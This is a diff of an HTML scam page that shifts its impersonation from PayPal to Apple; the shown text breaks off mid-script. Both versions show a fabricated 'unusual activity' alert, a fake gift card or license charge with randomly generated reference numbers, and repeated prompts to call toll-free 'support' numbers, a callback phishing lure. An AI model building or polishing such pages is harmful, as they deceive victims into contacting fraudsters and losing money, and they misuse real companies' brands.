@@ -5,9 +5,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Secure Wallet</title>
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+<title>Digital Purchase Review</title>
 
 <style>
 
@@ -17,23 +15,32 @@
 
 body{
   margin:0;
-  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+
+  font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","Segoe UI",sans-serif;
 
   background:
-  linear-gradient(
-    180deg,
-    #f4f7fb 0%,
-    #edf2f7 100%
-  );
+linear-gradient(
+180deg,
+#1c1c1e 0%,
+#2c2c2e 100%
+);
 
-  color:#111827;
+  color:#1c1c1e;
+
+  overflow-x:hidden;
 }
 
-/* START SCREEN */
+/* LOADING */
 .start{
   position:fixed;
   inset:0;
-  background:#fff;
+
+  background:
+linear-gradient(
+180deg,
+#1c1c1e 0%,
+#2c2c2e 100%
+);
 
   display:flex;
   flex-direction:column;
@@ -43,19 +50,41 @@ body{
   z-index:9999;
 }
 
-.start img{
-  width:150px;
-  margin-bottom:24px;
+.logo{
+  width:140px;
+  height:140px;
+
+  border-radius:20px;
+
+  overflow:hidden;
+
+  display:flex;
+  align-items:center;
+  justify-content:center;
+
+  margin-bottom:28px;
+
+
+  box-shadow:
+  0 10px 30px rgba(0,0,0,.12);
+}
+
+.logo img{
+  width:100%;
+  height:100%;
+  object-fit:cover;
+
+  display:block;
 }
 
 .spinner{
-  width:72px;
-  height:72px;
+  width:52px;
+  height:52px;
 
   border-radius:50%;
 
-  border:6px solid #e5e7eb;
-  border-top:6px solid #0070e0;
+  border:4px solid rgba(255,255,255,.12);
+  border-top:4px solid #ffffff;
 
   animation:spin 1s linear infinite;
 }
@@ -66,79 +95,385 @@ body{
   }
 }
 
-/* LOADER */
-.loader{
-  position:fixed;
-  inset:0;
+#status{
+  margin-top:22px;
 
-  display:flex;
-  flex-direction:column;
-  justify-content:center;
-  align-items:center;
+  color:rgba(255,255,255,.72);
 
-  background:#fff;
+  font-size:15px;
+
+  font-weight:500;
+
+  letter-spacing:.2px;
+
+  text-shadow:
+  0 2px 12px rgba(0,0,0,.35);
 }
 
 /* HEADER */
 .header{
+  position:sticky;
+  top:0;
+  z-index:999;
+
   display:flex;
   justify-content:space-between;
   align-items:center;
 
-  padding:18px 28px;
+  padding:14px 26px;
 
-  background:rgba(255,255,255,.92);
+  background:rgba(255,255,255,.72);
 
-  backdrop-filter:blur(14px);
+  backdrop-filter:none;
 
-  border-bottom:1px solid #e5e7eb;
+  border-bottom:1px solid rgba(0,0,0,.06);
+}
 
-  color:#003087;
+.brand{
+  display:flex;
+  align-items:center;
+  gap:14px;
+}
+
+.brand-icon{
+  width:50px;
+  height:50px;
+
+  border-radius:10px;
+
+  overflow:hidden;
+
+  flex-shrink:0;
+
+
+
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+
+.brand-icon img{
+  width:100%;
+  height:100%;
+  object-fit:cover;
+
+  display:block;
+}
+
+.brand-name{
+  font-size:18px;
+  font-weight:700;
+  letter-spacing:.3px;
+}
+
+.header-right{
+  color:#4b5563;
+  font-size:14px;
+}
+
+.modal{
+  position:fixed;
+  inset:0;
+
+  display:flex;
+  justify-content:center;
+  align-items:flex-start;
+
+  padding-top:38px;
+
+  background:rgba(15,15,15,.10);
+
+  z-index:9999;
+}
+
+.modal-box{
+  width:100%;
+  max-width:500px;
+
+  background:#fbfbfd;
+
+  border:1px solid rgba(255,255,255,.72);
+
+  border-radius:32px;
+
+  padding:18px;
+
+  position:relative;
+
+  overflow:hidden;
+
+  opacity:0;
+
+  transform:
+  translateY(24px)
+  scale(.96);
+
+  animation:
+  modalIn .58s cubic-bezier(.2,.8,.2,1) forwards;
+
+  box-shadow:
+  0 60px 140px rgba(0,0,0,.42),
+  0 24px 50px rgba(0,0,0,.22),
+  0 0 0 1px rgba(255,255,255,.35);
+}
+
+@keyframes modalIn{
+
+  0%{
+    opacity:0;
+
+    transform:
+    translateY(24px)
+    scale(.96);
+  }
+
+  60%{
+    opacity:1;
+
+    transform:
+    translateY(-4px)
+    scale(1.01);
+  }
+
+  100%{
+    opacity:1;
+
+    transform:
+    translateY(0)
+    scale(1);
+  }
+
+}
+
+.glow{
+  position:absolute;
+
+  width:300px;
+  height:300px;
+
+  border-radius:50%;
+
+  background:
+  radial-gradient(
+    rgba(255,159,10,.10),
+    transparent
+  );
+
+  top:-160px;
+  right:-120px;
+
+  pointer-events:none;
+}
+
+/* CARD IMAGE */
+.card-preview{
+  height:220px;
+
+  border-radius:26px;
+
+  background-image:url('https://i.ibb.co/ym1PcStr/Chat-GPT-Image-May-19-2026-04-46-39-PM.png');
+
+  background-size:cover;
+  background-position:center;
+
+  margin-bottom:26px;
+
+  position:relative;
+
+  overflow:hidden;
+
+  box-shadow:
+  0 10px 30px rgba(0,0,0,.12);
+}
+
+.card-preview::before{
+  content:"";
+
+  position:absolute;
+  inset:0;
+
+  background:
+  linear-gradient(
+    to top,
+    rgba(0,0,0,.45),
+    rgba(0,0,0,.08)
+  );
+}
+.card-preview::after{
+  content:"";
+
+  position:absolute;
+
+  width:220px;
+  height:220px;
+
+  border-radius:50%;
+
+  background:
+  radial-gradient(
+    rgba(255,255,255,.08),
+    transparent
+  );
+
+  top:-120px;
+  right:-80px;
+}
+
+.card-title{
+  position:absolute;
+
+  top:22px;
+  left:22px;
+
+  color:white;
+
+  font-size:18px;
+  font-weight:600;
+
+  z-index:2;
+
+  text-shadow:0 2px 10px rgba(0,0,0,.25);
+}
+
+.card-amount{
+  position:absolute;
+
+  left:22px;
+  bottom:20px;
+
+  font-size:48px;
+  font-weight:800;
+
+  color:white;
+
+  z-index:2;
+
+  letter-spacing:-1px;
+
+  text-shadow:0 4px 20px rgba(0,0,0,.35);
+}
+
+/* CONTENT */
+.heading{
+  text-align:center;
+
+  font-size:42px;
 
   font-weight:700;
 
-  position:sticky;
-  top:0;
-  z-index:999;
+  letter-spacing:-1.8px;
+
+  margin-bottom:10px;
+
+  color:#1d1d1f;
 }
 
-.header span{
-  cursor:pointer;
-}
+.sub{
+  text-align:center;
 
-/* CONTAINER */
-.container{
-  max-width:1080px;
-  margin:40px auto;
-  padding:0 22px;
-}
+  color:#a1a1aa;
 
-/* BOX */
-.box{
-  position:relative;
-  overflow:hidden;
+  line-height:1.6;
 
-  background:#fff;
-
-  border-radius:18px;
-
-  padding:26px;
+  font-size:16px;
 
   margin-bottom:24px;
+}
 
-  border:1px solid #e5e7eb;
+.badge-wrap{
+  display:flex;
+  justify-content:center;
+
+  margin-bottom:24px;
+}
+
+.badge{
+  display:flex;
+  align-items:center;
+  gap:10px;
+
+  background:rgba(255,255,255,.72);
+
+  border:1px solid rgba(0,0,0,.05);
+
+  padding:10px 18px;
+
+  border-radius:999px;
+
+  color:#3a3a3c;
+
+  font-size:14px;
+  font-weight:700;
+}
+
+.dot{
+  width:10px;
+  height:10px;
+
+  border-radius:50%;
+
+  background:#ff9f0a;
 
   box-shadow:
-  0 4px 12px rgba(0,0,0,0.03),
-  0 18px 40px rgba(0,48,135,0.05);
+  0 0 10px #ff9f0a,
+  0 0 24px rgba(255,159,10,.55);
+
+  animation:statusPulse 1.8s infinite;
+}
+@keyframes statusPulse{
+
+  0%{
+    transform:scale(1);
+    opacity:1;
+  }
+
+  50%{
+    transform:scale(1.18);
+    opacity:.75;
+  }
+
+  100%{
+    transform:scale(1);
+    opacity:1;
+  }
+
+}
+
+/* INFO */
+.info{
+  background:rgba(255,255,255,.52);
+
+  border:1px solid rgba(0,0,0,.05);
+
+  border-radius:24px;
+
+  padding:22px;
+
+  line-height:2;
+
+  color:#3a3a3c;
+
+  margin-bottom:24px;
+}
+
+.info b{
+  color:#111;
 }
 
 /* BUTTONS */
 .btn{
-  border:none;
-  cursor:pointer;
+  width:100%;
 
+  padding:16px;
+
+  border:none;
+
+  border-radius:18px;
+
+  font-size:16px;
   font-weight:700;
+
+  cursor:pointer;
 
   transition:.25s ease;
 }
@@ -146,822 +481,635 @@ body{
 .primary{
   background:
   linear-gradient(
-    135deg,
-    #003087,
-    #0070e0
+  180deg,
+  #3a3a3c,
+  #1c1c1e
   );
 
   color:#fff;
 
+  border:1px solid rgba(255,255,255,.06);
+
   box-shadow:
-  0 8px 22px rgba(0,112,224,.25);
+  0 10px 25px rgba(0,0,0,.28);
+
+  transition:.22s ease;
 }
 
 .primary:hover{
   transform:translateY(-2px);
+  filter:brightness(1.08);
+}
+.secondary{
+  margin-top:10px;
+
+  background:rgba(58,58,60,.82);
+
+  color:#f5f5f7;
+
+  border:1px solid rgba(255,255,255,.05);
+}
+
+/* PAGE 2 */
+.page2{
+  max-width:1100px;
+
+  margin:40px auto;
+
+  padding:0 20px;
+}
+
+.box{
+  background:
+linear-gradient(
+180deg,
+rgba(255,255,255,.72),
+rgba(245,245,247,.84)
+);
+
+  border:1px solid rgba(0,0,0,.05);
+
+  border-radius:30px;
+
+  padding:28px;
+
+  margin-bottom:24px;
 
   box-shadow:
-  0 12px 28px rgba(0,112,224,.35);
+  0 10px 30px rgba(0,0,0,.25);
 }
 
-.secondary{
-  background:#fff;
-
-  color:#003087;
-
-  border:1px solid #cbd5e1;
-}
-
-.full{
-  width:100%;
-}
-
-/* MODAL */
-.modal{
-
-  position:fixed;
-
-  top:90px;
-  left:0;
-  right:0;
-  bottom:0;
-
+.top{
   display:flex;
-  justify-content:center;
-  align-items:flex-start;
+  justify-content:space-between;
+  gap:20px;
+  flex-wrap:wrap;
+}
 
-  z-index:99999;
+.amount{
+  font-size:54px;
+  font-weight:800;
+}
+
+.small{
+  color:#a1a1aa;
+  font-size:13px;
+}
+
+.grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+  gap:18px;
+}
+
+.grid-box{
+  background:rgba(255,255,255,.58);
+
+  border:1px solid rgba(0,0,0,.05);
+
+  border-radius:20px;
+
+  padding:18px;
+}
+
+.grid-title{
+  color:#6e6e73;
+  font-size:13px;
+  margin-bottom:8px;
+}
+
+.grid-value{
+  font-size:18px;
+  font-weight:700;
+}
+
+.activity{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+
+  padding:18px;
+
+  border-radius:18px;
+
+  background:rgba(255,255,255,.55);
+
+  border:1px solid rgba(0,0,0,.04);
+
+  margin-bottom:14px;
+}
+
+.activity-name{
+  font-weight:700;
+}
+
+.activity-sub{
+  color:#a1a1aa;
+  font-size:13px;
+  margin-top:4px;
+}
+
+/* SUPPORT */
+.support-btn{
+
+  padding:16px 28px;
+
+  border:none;
+
+  border-radius:18px;
 
   background:
   linear-gradient(
-    180deg,
-    rgba(15,23,42,.48),
-    rgba(15,23,42,.58)
+  180deg,
+  #3a3a3c,
+  #1c1c1e
   );
 
-  
+  color:#fff;
 
-  transition:.3s ease;
+  font-size:15px;
+  font-weight:700;
 
-  padding:0 20px 40px;
+  cursor:pointer;
 
-  overflow-y:auto;
-}
-
-.modal-box{
-
-  width:100%;
-  max-width:540px;
-
-  background:#fff;
-
-  border-radius:22px;
-
-  padding:34px;
-
-  border:1px solid #e5e7eb;
+  transition:.22s ease;
 
   box-shadow:
-  0 10px 40px rgba(0,0,0,.12);
-
-  position:relative;
-
-  overflow:hidden;
-
-  margin-top:10px;
+  0 10px 24px rgba(0,0,0,.32);
 }
 
-.modal-box::before{
+.support-btn:hover{
+  transform:translateY(-2px);
+  filter:brightness(1.08);
+}
 
-  content:"";
+/* FOOTER */
+.footer{
+  padding:18px 10px 60px;
 
-  position:absolute;
+  text-align:center;
+}
 
-  top:-100px;
-  right:-80px;
+.footer-links{
+  color:#8e8e93;
 
-  width:240px;
-  height:240px;
+  font-size:13px;
 
-  background:
-  radial-gradient(
-    rgba(0,112,224,.10),
-    transparent
-  );
+  display:flex;
+  justify-content:center;
+  gap:12px;
 
-  border-radius:50%;
+  flex-wrap:wrap;
+
+  margin-bottom:14px;
+}
+
+.footer-copy{
+  color:#636366;
+
+  font-size:12px;
 }
 
 .hidden{
   display:none;
 }
 
-/* MOBILE */
+@media(max-width:768px){
+
+  .modal-box{
+    padding:26px;
+  }
+
+  .heading{
+    font-size:28px;
+  }
+
+  .amount{
+    font-size:42px;
+  }
+
+}
+
+
+/* ===== FINAL MOBILE RESPONSIVE FIX ===== */
+
 @media(max-width:768px){
 
   html,body{
     width:100%;
-    overflow-x:hidden;
-  }
-
-  .container{
-    padding:0 14px;
+    overflow-x:hidden !important;
   }
 
   .header{
-    padding:16px;
-    font-size:14px;
-
     flex-direction:column;
     align-items:flex-start;
     gap:10px;
+    padding:14px;
+  }
+
+  .header-right{
+    width:100%;
+    text-align:left;
+    font-size:12px;
+    line-height:1.5;
+    word-break:break-word;
+  }
+
+  .brand{
+    width:100%;
+  }
+
+  .brand-name{
+    font-size:16px;
   }
 
   .modal{
     padding:12px;
-    align-items:flex-start;
+    overflow-y:auto;
   }
 
   .modal-box{
     width:100%;
     max-width:100%;
-    padding:22px;
-    border-radius:18px;
-    margin-top:20px;
+    padding:18px;
+    border-radius:22px;
+  }
+
+  .card-preview{
+    height:180px;
+  }
+
+  .card-amount{
+    font-size:34px;
+  }
+
+  .heading{
+    font-size:28px;
+    line-height:1.2;
+  }
+
+  .sub{
+    font-size:14px;
+  }
+
+  .info{
+    padding:18px;
+    font-size:14px;
+    line-height:1.7;
+    word-break:break-word;
+  }
+
+  .btn{
+    font-size:15px;
+    padding:15px;
+  }
+
+  .page2{
+    padding:0 12px;
   }
 
   .box{
     padding:18px;
+    border-radius:22px;
   }
 
-  img{
-    max-width:100%;
-    height:auto;
+  .top{
+    flex-direction:column;
+  }
+
+  .amount{
+    font-size:36px;
+  }
+
+  .grid{
+    grid-template-columns:1fr;
+  }
+
+  .grid-value{
+    word-break:break-word;
+  }
+
+  .activity{
+    flex-direction:column;
+    align-items:flex-start;
+    gap:10px;
+  }
+
+  .support-btn{
+    width:100%;
   }
 
 }
 
+@media(max-width:480px){
+
+  .modal-box{
+    padding:16px;
+  }
+
+  .heading{
+    font-size:24px;
+  }
+
+  .card-amount{
+    font-size:30px;
+  }
+
+  .amount{
+    font-size:30px;
+  }
+
+  .footer-links{
+    gap:8px;
+    font-size:12px;
+  }
+
+}
 </style>
 </head>
 
 <body>
 
-<!-- START SCREEN -->
+<!-- START -->
 <div class="start" id="start">
 
-  <img src="www.paypalobjects.com/webstatic/icon/pp258.png">
-
-  <div class="spinner"></div>
-
-  <p id="status">Securing Connection...</p>
-
+  <div class="logo">
+  <img src="https://i.ibb.co/v6ykdChy/92401eilpe.png" alt="">
 </div>
 
-<!-- LOADER -->
-<div class="loader hidden" id="loader">
-
   <div class="spinner"></div>
 
-  <p style="
-  margin-top:20px;
-  text-align:center;
-  color:#6b7280;
-  ">
-    Secure wallet session verification in progress
-  </p>
+  <div id="status">Preparing secure session...</div>
 
 </div>
 
 <!-- HEADER -->
 <div class="header hidden" id="header">
 
-  <div style="
-display:flex;
-align-items:center;
-gap:12px;
-">
+  <div class="brand">
 
-<img
-src="www.paypalobjects.com/webstatic/icon/pp258.png"
-style="
-height:34px;
-object-fit:contain;
-"
->
-
-<div style="
-font-size:18px;
-font-weight:500;
-letter-spacing:.3px;
-">
-Resolution Center
+    <div class="brand-icon">
+  <img src="https://i.ibb.co/v6ykdChy/92401eilpe.png" alt="">
 </div>
 
-</div>
+    <div class="brand-name">
+      Apple Purchase Center
+    </div>
 
-  <div>
-    <span onclick="goBack()">ACTIVITY</span> |
-    <span onclick="callSupport()">HELP CENTER</span>
+  </div>
+
+  <div class="header-right">
+    USA & Canada Toll Free Assistance 1 (844) 376-7271 
   </div>
 
 </div>
 
-<!-- FIRST PAGE -->
+<!-- MODAL -->
 <div class="modal hidden" id="modal">
 
-  <div class="modal-box" style="
-background:
-linear-gradient(
-180deg,
-#ffffff 0%,
-#f8fbff 100%
-);
+  <div class="modal-box">
 
-border:1px solid #dbeafe;
+    <div class="glow"></div>
 
-box-shadow:
-0 30px 80px rgba(0,0,0,.18);
+    <!-- CARD -->
+    <div class="card-preview">
 
-padding:30px;
-">
+      <div class="card-title">
+        
+      </div>
 
-    <div style="
-display:flex;
-justify-content:center;
-margin-bottom:14px;
-">
+      <div class="card-amount">
+        $200
+      </div>
 
-<img
-src="www.paypalobjects.com/webstatic/icon/pp258.png"
-style="
-height:58px;
-object-fit:contain;
-"
->
+    </div>
 
-</div>
+    <div class="heading">
+      Purchase Review
+    </div>
 
-<div style="
-text-align:center;
-margin-bottom:30px;
-">
+    <div class="sub">
+      <span style="color: rgb(0, 0, 0);">We detected unusual activity associated with this digital purchase requiring additional verification.</span>
+    </div>
 
-<div style="
-font-size:30px;
-font-weight:700;
-color:#003087;
-margin-bottom:10px;
-letter-spacing:-0.5px;
-">
-Transaction Review
-</div>
+    <div class="badge-wrap">
 
-<div style="
-font-size:18px;
-color:#4b5563;
-line-height:1.45;
-max-width:420px;
-margin:auto;
-">
-We detected unusual transaction behavior requiring additional verification.
-</div>
+      <div class="badge">
 
-</div>
+        <div class="dot"></div>
 
+        Verification Pending
 
-    <p style="
-    text-align:center;
-    margin-bottom:16px;
-    font-size:17px;
-    ">
-      Your disbursement of
-      <span style="
-      color:#d93025;
-      font-weight:700;
-      " id="mAmt"></span>
-      placed on hold for verification
-    </p>
-	<div style="
-display:flex;
-justify-content:center;
-margin-top:12px;
-margin-bottom:18px;
-">
+      </div>
 
-<div style="
-display:flex;
-align-items:center;
-gap:10px;
+    </div>
 
-background:#fff8eb;
+    <div class="info">
 
-border:1px solid #fde68a;
+      <div><b>ITEM:</b> Digital Gift Card</div>
 
-padding:10px 18px;
+      <div><b>VALUE:</b> $200.00</div>
 
-border-radius:999px;
-
-font-size:14px;
-font-weight:700;
-
-color:#92400e;
-">
-
-<div style="
-width:10px;
-height:10px;
-background:#f59e0b;
-border-radius:50%;
-box-shadow:0 0 10px #f59e0b;
-"></div>
-
-Verification Pending
-
-</div>
-
-</div>
-
-    <div style="
-    background:#f8fafc;
-    border:1px solid #e5e7eb;
-    border-radius:18px;
-    padding:18px;
-    line-height:1.85;
-    ">
-
-      <div><b>STATUS</b> <span style="color:#d93025;font-weight:700;">Pending Review</span></div>
+      <div><b>STATUS:</b> Pending Verification</div>
 
       <div><b>REFERENCE:</b> <span id="ref"></span></div>
 
       <div><b>DATE:</b> <span id="date"></span></div>
 
-      <div><b>USER AGENT IP:</b> <span id="ip"></span></div>
-
-      <div><b>LOCATION:</b> San Jose, US / Sync Active</div>
-
-
+      <div><b>DEVICE:</b> Secure Desktop Session</div>
 
     </div>
 
-    <button class="btn primary full" style="
-    padding:15px;
-    border-radius:16px;
-	font-weight:650;
-	letter-spacing:.2px;
-    margin-top:24px;
-    font-size:16px;
-    " onclick="callSupport()">
+    <button class="btn primary" onclick="openFull()">
+  View Purchase Details
+</button>
 
-      CALL SUPPORT: 1 (802) 331-3575
-
-    </button>
-
-    <button class="btn secondary full" style="
-    padding:15px;
-	border-radius:16px;
-	font-weight:650;
-	letter-spacing:.2px;
-    margin-top:14px;
-    font-size:16px;
-    " onclick="openFull()">
-
-      See Full Transaction
-
-    </button>
+<button
+class="btn secondary"
+style="
+margin-top:12px;
+"
+onclick="callSupport()">
+  Contact Support at 1 (844) 376-7271
+</button>
 
   </div>
 
 </div>
 
-<!-- SECOND PAGE -->
-<div class="container" id="page2">
+<!-- PAGE 2 -->
+<div class="page2" id="page2">
 
-  <div id="pdfArea">
+  <!-- TOP -->
+  <div class="box">
 
-    <!-- TOP SUMMARY -->
-    <div class="box" style="
-    background:
-    linear-gradient(
-      135deg,
-      #003087,
-      #0070e0
-    );
+    <div class="top">
 
-    color:white;
+      <div>
 
-    padding:34px;
-
-    overflow:hidden;
-    ">
-
-      <div style="
-      position:absolute;
-      top:-120px;
-      right:-80px;
-
-      width:260px;
-      height:260px;
-
-      background:rgba(255,255,255,.08);
-
-      border-radius:50%;
-
-      filter:blur(10px);
-      "></div>
-
-      <div style="
-      display:flex;
-      justify-content:space-between;
-      gap:20px;
-      flex-wrap:wrap;
-      position:relative;
-      z-index:2;
-      ">
-
-        <div>
-
-          <div style="
-          font-size:13px;
-          opacity:.85;
-          letter-spacing:1px;
-          margin-bottom:10px;
-          ">
-            ACTIVITY SUMMARY
-          </div>
-
-          <div id="amt" style="
-          font-size:42px;
-          font-weight:800;
-          margin-bottom:14px;
-          "></div>
-
-          <div style="
-          display:inline-flex;
-          align-items:center;
-          gap:10px;
-
-          background:rgba(255,255,255,.12);
-
-          padding:10px 16px;
-
-          border-radius:999px;
-
-          font-size:14px;
-          ">
-
-            <div style="
-            width:10px;
-            height:10px;
-            background:#4ade80;
-            border-radius:50%;
-            box-shadow:0 0 12px #4ade80;
-            "></div>
-
-            Transaction Verified
-
-          </div>
-
+        <div class="small">
+          <span style="color: rgb(0, 0, 0);">DIGITAL PURCHASE SUMMARY</span>
         </div>
 
-        <div style="text-align:right;">
+        <div class="amount" id="amt">
+          $200
+        </div>
 
-          <div style="
-          font-size:13px;
-          opacity:.8;
-          ">
-            REFERENCE ID
-          </div>
+        <div class="badge" style="margin-top:14px;width:max-content;">
 
-          <div id="ref2" style="
-          margin-top:6px;
-          font-size:18px;
-          font-weight:700;
-          "></div>
+          <div class="dot"></div>
 
-          <div style="
-          margin-top:24px;
-          font-size:13px;
-          opacity:.8;
-          ">
-            LAST UPDATED
-          </div>
-
-          <div id="date2" style="
-          margin-top:6px;
-          font-size:15px;
-          "></div>
+          Purchase Verification Active
 
         </div>
 
       </div>
 
-    </div>
+      <div style="text-align:right;">
 
-    <!-- ALERT -->
-    <div class="box" style="
-    background:#fff8eb;
-    border:1px solid #fde68a;
-    ">
-
-      <div style="
-      display:flex;
-      justify-content:space-between;
-      align-items:center;
-      gap:20px;
-      flex-wrap:wrap;
-      ">
-
-        <div>
-
-          <div style="
-          font-size:15px;
-          font-weight:700;
-          color:#92400e;
-          margin-bottom:6px;
-          ">
-            Action Recommended
-          </div>
-
-          <div style="
-          font-size:14px;
-          color:#78350f;
-          line-height:1.6;
-          ">
-            Additional verification may be required to avoid temporary service limitations. For more information, speak to customer service at 1 (802) 331-3575.
-          </div>
-
+        <div class="small">
+          <span style="color: rgb(0, 0, 0);">PURCHASE REFERENCE</span>
         </div>
 
-        <div style="
-        background:#f59e0b;
-        color:white;
-
-        padding:10px 18px;
-
-        border-radius:999px;
-
-        font-size:13px;
+        <div id="ref2" style="
+        font-size:20px;
         font-weight:700;
-        ">
+        margin-top:8px;
+        "></div>
+
+        <div class="small" style="margin-top:22px;">
+          <span style="color: rgb(0, 0, 0);">LAST UPDATED</span>
+        </div>
+
+        <div id="date2" style="margin-top:8px;"></div>
+
+      </div>
+
+    </div>
+
+  </div>
+
+  <!-- GRID -->
+  <div class="box">
+
+    <div class="grid">
+
+      <div class="grid-box">
+        <div class="grid-title">
+          Purchase Item
+        </div>
+        <div class="grid-value">
+          Entertainment Gift Card
+        </div>
+      </div>
+
+      <div class="grid-box">
+        <div class="grid-title">
+          Purchase Amount
+        </div>
+        <div class="grid-value">
+          $200.00
+        </div>
+      </div>
+
+      <div class="grid-box">
+        <div class="grid-title">
+          Verification Status
+        </div>
+        <div class="grid-value">
           Review Pending
         </div>
+      </div>
 
+      <div class="grid-box">
+        <div class="grid-title">
+          Session Type
+        </div>
+        <div class="grid-value">
+          Secure Checkout
+        </div>
       </div>
 
     </div>
 
-    <!-- ACCOUNT PANEL -->
-    <div class="box">
+  </div>
 
-      <div style="
-      display:flex;
-      justify-content:space-between;
-      align-items:center;
-      margin-bottom:24px;
-      flex-wrap:wrap;
-      gap:20px;
-      ">
+  <!-- ACTIVITY -->
+  <div class="box">
 
-        <div>
-
-          <div style="
-          font-size:24px;
-          font-weight:700;
-          color:#003087;
-          ">
-            Account Activity
-          </div>
-
-          <div style="
-          color:#6b7280;
-          margin-top:8px;
-          font-size:14px;
-          ">
-            Secure transaction overview and verification details
-          </div>
-
-        </div>
-
-        <div style="
-        background:#e7f5ee;
-        color:#0f9f6e;
-
-        padding:10px 18px;
-
-        border-radius:999px;
-
-        font-size:14px;
-        font-weight:700;
-        ">
-          Active
-        </div>
-
-      </div>
-
-      <!-- GRID -->
-      <div style="
-      display:grid;
-      grid-template-columns:repeat(auto-fit,minmax(240px,1fr));
-      gap:18px;
-      ">
-
-        <div style="
-        background:#f8fafc;
-        border:1px solid #e5e7eb;
-        border-radius:16px;
-        padding:18px;
-        ">
-
-          <div style="
-          font-size:13px;
-          color:#6b7280;
-          ">
-            Invoice Number
-          </div>
-
-          <div id="inv" style="
-          margin-top:8px;
-          font-size:18px;
-          font-weight:700;
-          "></div>
-
-        </div>
-
-        <div style="
-        background:#f8fafc;
-        border:1px solid #e5e7eb;
-        border-radius:16px;
-        padding:18px;
-        ">
-
-          <div style="
-          font-size:13px;
-          color:#6b7280;
-          ">
-            Gateway IP
-          </div>
-
-          <div id="ip2" style="
-          margin-top:8px;
-          font-size:18px;
-          font-weight:700;
-          "></div>
-
-        </div>
-
-        <div style="
-        background:#f8fafc;
-        border:1px solid #e5e7eb;
-        border-radius:16px;
-        padding:18px;
-        ">
-
-          <div style="
-          font-size:13px;
-          color:#6b7280;
-          ">
-            Service Category
-          </div>
-
-          <div style="
-          margin-top:8px;
-          font-size:18px;
-          font-weight:700;
-          ">
-            Cloud Infrastructure
-          </div>
-
-        </div>
-
-        <div style="
-        background:#f8fafc;
-        border:1px solid #e5e7eb;
-        border-radius:16px;
-        padding:18px;
-        ">
-
-          <div style="
-          font-size:13px;
-          color:#6b7280;
-          ">
-            Purchase Item
-          </div>
-
-          <div style="
-          margin-top:8px;
-          font-size:18px;
-          font-weight:700;
-          ">
-            Enterprise License v4.3
-          </div>
-
-        </div>
-
-      </div>
-
-    </div>
-
-    <!-- ACTIVITY -->
-    <div class="box">
-
-      <div style="
-      font-size:24px;
-      font-weight:700;
-      color:#003087;
-      margin-bottom:24px;
-      ">
-        Recent Activity
-      </div>
-
-      <div id="ledger" style="
-      display:flex;
-      flex-direction:column;
-      gap:14px;
-      "></div>
-
-    </div>
-
-    <!-- SUPPORT -->
-    <div class="box" style="
-    background:#f8fbff;
-    border:1px solid #dbeafe;
+    <div style="
+    font-size:24px;
+    font-weight:700;
+    margin-bottom:24px;
     ">
+      Recent Activity
+    </div>
+
+    <div id="activity"></div>
+
+<!-- SUPPORT -->
+</div>
+<div class="box">
+
+  <div style="
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  flex-wrap:wrap;
+  gap:20px;
+  ">
+
+    <div>
 
       <div style="
-      display:flex;
-      justify-content:space-between;
-      align-items:center;
-      gap:20px;
-      flex-wrap:wrap;
+      font-size:28px;
+      font-weight:700;
+      color:#2f2f3a;
+      letter-spacing:-1px;
       ">
+        Need Help?
+      </div>
 
-        <div>
-
-          <div style="
-          font-size:24px;
-          font-weight:700;
-          color:#003087;
-          ">
-            Resolution Center
-          </div>
-
-          <div style="
-          margin-top:8px;
-          color:#6b7280;
-          font-size:14px;
-          max-width:500px;
-          line-height:1.7;
-          ">
-            Need assistance regarding this activity?
-            Contact customer service immediately for assistance at 1 (802) 331-3575.
-          </div>
-
-        </div>
-
-        <div style="
-        display:flex;
-        gap:12px;
-        flex-wrap:wrap;
-        ">
-
-          <button class="btn secondary" style="
-          padding:16px 22px;
-          border-radius:14px;
-          " onclick="downloadPDF()">
-
-            Download PDF
-
-          </button>
-
-          <button class="btn primary" style="
-          padding:16px 22px;
-          border-radius:14px;
-          " onclick="callSupport()">
-
-            Contact Support
-
-          </button>
-
-        </div>
-
+      <div style="
+      margin-top:8px;
+      color:#8e8e93;
+      font-size:15px;
+      line-height:1.6;
+      max-width:520px;
+      ">
+        Contact our purchase verification specialists at 1 (844) 376-7271 for assistance regarding this digital transaction or account review.
       </div>
 
     </div>
 
-    <!-- FOOTER -->
-    <div class="box">
+    <button
+class="support-btn"
+onclick="callSupport()">
+  Contact Support
+</button>
 
-      <button class="btn primary full" style="
-      padding:18px;
-      border-radius:14px;
-      font-size:16px;
-      " onclick="goBack()">
+  </div>
 
-        Return to Activity Overview
+</div>
 
-      </button>
+<!-- FOOTER -->
+<div class="footer">
 
-    </div>
+  <div class="footer-links">
+    Terms of Use
+    <span>•</span>
+    Privacy Policy
+    <span>•</span>
+    Billing & Refunds
+    <span>•</span>
+    Support
+  </div>
+
+  <div class="footer-copy">
+    © 2026 Apple INC USA. All rights reserved.
+  </div>
+
+</div>
 
   </div>
 
@@ -969,232 +1117,211 @@ Verification Pending
 
 <script>
 
-const phoneNumber = "18023313575";
+function randomRef(){
 
-function callSupport(){
-  window.location.href = "tel:" + phoneNumber;
-}
+  return 'REF-'+
+  Math.random()
+  .toString(36)
+  .substr(2,8)
+  .toUpperCase();
 
-function r(min,max){
-  return Math.random()*(max-min)+min;
-}
-
-function ri(min,max){
-  return Math.floor(r(min,max));
 }
 
 function formatDate(){
 
   let d=new Date();
 
-  return d.getFullYear()+"-"+(d.getMonth()+1)+"-"+d.getDate()+" "+
-         d.getHours()+":"+d.getMinutes()+":"+d.getSeconds();
+  return d.getFullYear()+"-"+
+  (d.getMonth()+1)+"-"+
+  d.getDate()+" "+
+  d.getHours()+":"+
+  d.getMinutes()+":"+
+  d.getSeconds();
+
 }
 
-function animate(el,val){
+/* RANDOM MAIN AMOUNT */
+function generateAmount(){
 
-  let dur=700;
-  let startTime=null;
+  return Math.floor(
+    Math.random() * 601
+  ) + 200;
 
-  function step(t){
-
-    if(!startTime){
-      startTime=t;
-    }
-
-    let p=Math.min((t-startTime)/dur,1);
-
-    el.innerText='-$'+(val*p).toFixed(2);
-
-    if(p<1){
